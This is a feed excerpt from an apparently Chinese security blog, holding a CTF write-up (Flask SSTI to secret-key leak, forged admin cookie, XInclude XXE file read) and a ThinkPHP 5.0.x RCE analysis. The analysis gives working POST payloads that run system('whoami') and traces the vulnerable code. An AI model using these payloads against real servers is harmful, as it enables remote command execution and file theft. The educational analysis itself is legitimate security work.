class="line">https://paper.seebug.org/449/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发先知社区，文章链接：&lt;a href=&quot;https://xz.aliyun.com/t/4214&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4214&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前段时间想写一个静态代码审计工具,需要对php扩展熟悉一些,那么自己从零开始接触这一块,如果有错误的地方,麻烦师傅们指正。&lt;/p&gt;
&lt;p&gt;另外呢网上虽然有一些文章,但是感觉都不是特别细,对于刚入门的我来说有些难以理解,因此详细的记录下自己的学习过程。&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="代码审计" scheme="http://kctf.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php拓展" scheme="http://kctf.github.io/tags/php%E6%8B%93%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>鹏城杯2018WEB shadow题解</title>
    <link href="http://kctf.github.io/2019/02/12/2018-pcb-shadow/"/>
    <id>http://kctf.github.io/2019/02/12/2018-pcb-shadow/</id>
    <published>2019-02-12T15:30:43.000Z</published>
    <updated>2019-06-12T13:16:41.256Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天打完了鹏城杯，还是一脸懵逼，主办方疯狂放提示，选手疯狂懵逼。。。<br>我在一堆脑洞题之间还是看到了一道比较有意思的web题目，虽然最后也没出flag，但还是挺有感悟的。</p><a id="more"></a><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给你一个flask搭建的网站，除了登录注册之外也没发现什么功能， 注释里看到有<code>/upload</code>路径，但访问提示需要admin权限。又四处游荡发现几个js不存在，回显是：</p><p><img src="https://img.5am3.com/20190212154998561366780.png" alt="20190212154998561366780.png"></p><p>看到这里，应该是有404页面的SSTI漏洞了，但是试了几次发现无法直接命令执行，只好寻求来读一些内置变量，<code>config</code>和<code>self</code>都被禁了，读了<a href="https://blog.csdn.net/qq_33020901/article/details/83036927" target="_blank" rel="noopener">这位大佬的文章</a>。可知，可以通过<code>    </code>读到一些变量，其中<code></code>可以读到<code>SECRET_KEY</code></p><p><img src="https://img.5am3.com/20190212154998565995974.png" alt="20190212154998565995974.png"></p><p>这样我们就可以来伪造flask的cookie，获得admin权限了。通过访问<code></code>拿到cookie</p><p><img src="https://img.5am3.com/2019021215499856735385.png" alt="2019021215499856735385.png"></p><p>拆开看看里面有啥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s=URLSafeTimedSerializer(<span class="string">"as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf"</span>, salt=<span class="string">"cookie-session"</span>,signer_kwargs=&#123;<span class="string">"key_derivation"</span>:<span class="string">"hmac"</span>,<span class="string">"digest_method"</span>:<span class="string">"sha1"</span>&#125;)</span><br><span class="line">data = s.loads(<span class="string">".eJw9kMFqg0AQhl-l7DkHXdNLIAfLWjGwI8oamb2INabu6qagkTQb8u4dcuhhYGDm-4b5H6w5z_0ysN25nZZ-wxpzYrsHe_tiOwa8uqHPPPqRqrgh1xZsctOqo07e0RaRdhjlabXN68yDxUCKg9G2irQaJu3KSdZILO2rOJQeRiQO0iLE-jiiS361jQPpjg55cUdOM5eF2sGQK-m1-L6jAqcFeilKA-Iw0H2PPOE6xQgUjFrJAES1Z88N65b53Fx_xv7y_wKhIaRVBOLToC1HwsNcfEySVxxIq9PSguhCmSYB1EkgbbaV8f6lM0vTnpwh2XVeKZpL63pSDmu7mJlt2Lr08ysu9s6ef3KlazU.XAOwLQ.q-Gin27oj8k69vvulgiayMpFKJs"</span>)</span><br><span class="line"><span class="keyword">print</span> (data)</span><br></pre></td></tr></table></figure><p><img src="https://img.5am3.com/20190212154998569398968.png" alt="20190212154998569398968.png"></p><p>可以看到这里<code>is_admin</code>是<code>False</code>,改成<code>True</code>再打包起来就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = s.dumps(&#123;<span class="string">'_fresh'</span>: <span class="keyword">True</span>, <span class="string">'_id'</span>: &#123;<span class="string">' b'</span>: <span class="string">'ZTM3ODI5NTdjYTIxN2I0YzU5ZjgzNjBmZjgwMDE5YzM3ODI0MzZhOTkwNzdmOWIyOTAzMWU5YzkxZDNmYmM5MGQyM2M4N2FkZDQ2NThlZmUyNzA5ZTUwMGVmZDI2NDE5ODZlM2NjNWQ0NmY5NmRlNTQwYjg2MmY0ZTgwYjBiNTI='</span>&#125;, <span class="string">'csrf_token'</span>: &#123;<span class="string">' b'</span>: <span class="string">'NWFkNmQ2OTgwZmU5ZGMyNWYxMTdiNzBhZDBiMTIxNjcxYjllZWM1Yw=='</span>&#125;, <span class="string">'is_admin'</span>: <span class="keyword">True</span>, <span class="string">'name'</span>: <span class="string">'huasir'</span>, <span class="string">'user_id'</span>: <span class="string">'5'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure><p>拿着这个去访问upload，然后可以上传文件。当然python直接上传貌似不能拿shell，试了几次发现上传XML文件有回显，但是上传常见的XXE payload会显示错误。</p><p><img src="https://img.5am3.com/20190212154998571710950.png" alt="20190212154998571710950.png"></p><p>参考<a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">这篇文章</a>可以看到用XInclude可以避开使用<code>ENTITY</code>关键字：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>回显<code>/etc/passwd</code>内容</p><p><img src="https://img.5am3.com/20190212154998573865102.png" alt="20190212154998573865102.png"></p><p>看到有个rq用户也有<code>bash</code>,读取其用户目录下的<code>.bash_history</code>可以看到flag文件的名字，遂构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/rq/f123333333ag"</span> <span class="attr">parse</span>=<span class="string">"text"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>flag:<br><img src="https://img.5am3.com/20190212154998575010135.png" alt="20190212154998575010135.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>一开始我失败的原因是我想用flask服务来得到cookie：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, escape, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'as/*d21as-+dhasod5a4s54:&gt;&lt;*()dfdsf'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello, &#123;&#125;\ncookie: &#123;&#125;'</span>.format(escape(session[<span class="string">'name'</span>]),request.cookies)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello, stranger\n'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">session[<span class="string">'csrf_token'</span>] = <span class="string">'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'</span></span><br><span class="line">    session[<span class="string">'_id'</span>] = <span class="string">'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'</span></span><br><span class="line">    session[<span class="string">'user_id'</span>] = <span class="string">'1'</span></span><br><span class="line">    session[<span class="string">'name'</span>] = <span class="string">'admin'</span></span><br><span class="line">    session[<span class="string">'is_admin'</span>] = <span class="keyword">True</span></span><br><span class="line">    session[<span class="string">'_fresh'</span>] = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login success"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>, debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>但是这样的cookie能进入/upload页面，但是一传文件就又反馈<code>only admin can use it</code>，结束后我又试了两次，又行了?_?….蜜汁，这样应该是没有影响的。<br>可能是因为我把flask服务改到一个页面里了？？/px</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'csrf_token'</span>] = <span class="string">'IjQ1ZTgwOGU3YWY5YmZjOGUwM2U1MDQ1OTUxODI0MmRhNDQyYTM0OTci.XANzdg.ljY0IMuCAb2ovypjBa5OvzegdDs'</span></span><br><span class="line">    session[<span class="string">'_id'</span>] = <span class="string">'bc00ab0feca90420847a2fc0ea2d0491ee7177c453d037a041383b6f4b434304eae5fa0a220dc0111abd963bbcca5c466b6303b0afacabf8544523cdbc83e7c4'</span></span><br><span class="line">    session[<span class="string">'user_id'</span>] = <span class="string">'5'</span></span><br><span class="line">    session[<span class="string">'name'</span>] = <span class="string">'huasir'</span></span><br><span class="line">    session[<span class="string">'is_admin'</span>] = <span class="keyword">True</span></span><br><span class="line">    session[<span class="string">'_fresh'</span>] = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello, &#123;&#125;\ncookie: &#123;&#125;'</span>.format(escape(session[<span class="string">'name'</span>]),request.cookies)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello, stranger\n'</span></span><br></pre></td></tr></table></figure><p>python2和python3起服务虽然结果不同，但都能用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天打完了鹏城杯，还是一脸懵逼，主办方疯狂放提示，选手疯狂懵逼。。。&lt;br&gt;我在一堆脑洞题之间还是看到了一道比较有意思的web题目，虽然最后也没出flag，但还是挺有感悟的。&lt;/p&gt;
    
    </summary>
    
      <category term="web" scheme="http://kctf.github.io/categories/web/"/>
    
    
      <category term="flask" scheme="http://kctf.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.x-RCE分析</title>
    <link href="http://kctf.github.io/2019/02/01/thinkphp5-x-RCE/"/>
    <id>http://kctf.github.io/2019/02/01/thinkphp5-x-RCE/</id>
    <published>2019-02-01T13:03:28.000Z</published>
    <updated>2019-06-12T13:16:41.257Z</updated>
    
    <content type="html"><![CDATA[<h4 id="thinkphp5-0-22"><a href="#thinkphp5-0-22" class="headerlink" title="thinkphp5.0.22"></a>thinkphp5.0.22</h4><p>开debug模式,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:10080/thinkphp_5.0.22/public/</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><a id="more"></a><p>关debug模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure><p>断点我直接下在了最后的RCE的地方,首先看一下调用堆栈</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzpot17mzxj30l40fejtm.jpg" alt></p><p>在这个调用堆栈里其实少了一个关键的一次调用,从<code>routeCheck</code>到<code>$method = strtolower($request-&gt;method());</code>这个地方,</p><p>先看一下这个地方</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fzppfxxk0xj30y40d8dj4.jpg" alt></p><p>在<code>request.php</code>526行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure><p>在<code>think\config\app.php</code>中可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 表单请求类型伪装变量</span><br><span class="line">&apos;var_method&apos;             =&gt; &apos;_method&apos;,</span><br></pre></td></tr></table></figure><p>那么我我们可以通过传递<code>_method</code>参数,然后进入<code>$this-&gt;{$this-&gt;method}($_POST);</code>调用Request类中的任意方法,<code>$_POST</code>就是传入的参数,也就是说可以实现任意方法任意参数的调用,继续看构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$options=&gt;$_POST</code>,然后判断类中是否有这个属性,如果有即赋值</p><p>继续往下走,通过<code>$data = *self*::exec($dispatch, $config);</code>,因为<code>type=method</code>进入到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'method'</span>: <span class="comment">// 回调方法</span></span><br><span class="line">    $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</span><br><span class="line">    $data = <span class="keyword">self</span>::invokeMethod($dispatch[<span class="string">'method'</span>], $vars);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>然后进入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">    $method = $this-&gt;method(true);</span><br></pre></td></tr></table></figure><p>这里还是会进入到method方法,但是这次为true，进入的分支不同,然后进入到server方法,接着</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);</span><br></pre></td></tr></table></figure><p>进入到input方法,断点停在了<code>$this-&gt;filterValue($data, $name, $filter);</code>但是往上看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = $this-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure><p>有个赋值的操作,跟进看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为一开始<code>filter</code>变量被我们覆盖成了<code>system</code>,所以没影响,最后进入到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure><p>但是到这里发现了问题,<code>$value</code>不对,想一下为什么不对,原因是我把断点下在了RCE的地方,但是呢第一次调用就停了,RCE的地方还得往下走,继续回到<code>param</code>方法,将当前请求参数和URL地址中的参数合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当前请求参数和URL地址中的参数合并</span><br><span class="line">$this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br></pre></td></tr></table></figure><p>执行到最后再次进入input方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure><p>这次<code>data</code>是数组,进入与刚才不一样的分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">    reset($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>array_walk_recursive</code>函数会对数组中的成员递归的调用<code>filterValue</code>,进入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = call_user_func($filter, $value); //$filter:system  $value:whoami</span><br></pre></td></tr></table></figure><p>然后解释一下为什么路由要有<code>s=captcha</code>,<code>vendor/think-captcha/src/helper.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\think\Route::get(<span class="string">'captcha/[:id]'</span>, <span class="string">"\\think\\captcha\\CaptchaController@index"</span>);</span><br></pre></td></tr></table></figure><p>可以看到对应的路有信息,然后在route.php的1513-1519行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#125; elseif (false !== strpos($route, &apos;\\&apos;)) &#123;</span><br><span class="line">    // 路由到方法</span><br><span class="line">    list($path, $var) = self::parseUrlPath($route);</span><br><span class="line">    $route            = str_replace(&apos;/&apos;, &apos;@&apos;, implode(&apos;/&apos;, $path));</span><br><span class="line">    $method           = strpos($route, &apos;@&apos;) ? explode(&apos;@&apos;, $route) : $route;</span><br><span class="line">    $result           = [&apos;type&apos; =&gt; &apos;method&apos;, &apos;method&apos; =&gt; $method, &apos;var&apos; =&gt; $var];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到规则,因此type为mehod。</p><h4 id="thinkphp5-0-5"><a href="#thinkphp5-0-5" class="headerlink" title="thinkphp5.0.5"></a>thinkphp5.0.5</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:10080/thinkphp_5.0.5/public/</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;method=GET&amp;get[]=system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure><p>看下调用堆栈</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzqwzllxivj30k60bejsz.jpg" alt></p><p>前面到调用Request类中的任意方法的过程是一样的,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filter[]=assert</span><br><span class="line">get[]=system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure><p>因为默认开着debug,进入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (self::$debug) &#123;</span><br><span class="line">    Log::record(&apos;[ ROUTE ] &apos; . var_export($dispatch, true), &apos;info&apos;);</span><br><span class="line">    Log::record(&apos;[ HEADER ] &apos; . var_export($request-&gt;header(), true), &apos;info&apos;);</span><br><span class="line">    Log::record(&apos;[ PARAM ] &apos; . var_export($request-&gt;param(), true), &apos;info&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$request-&gt;param</code>中,然后到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">        $data = array_merge(<span class="keyword">$this</span>-&gt;param, $file);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为上面请求了method为GET,那么会先将参数合并,然后进入input</p><p>这里因为上面赋值操作也让<code>get</code>为<code>system(&#39;whoami&#39;)</code>,</p><p>继续进入input中</p><p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzqyaqlxx1j314k0hkgp9.jpg" alt></p>]]></content>
    
    <summary type="html">
    
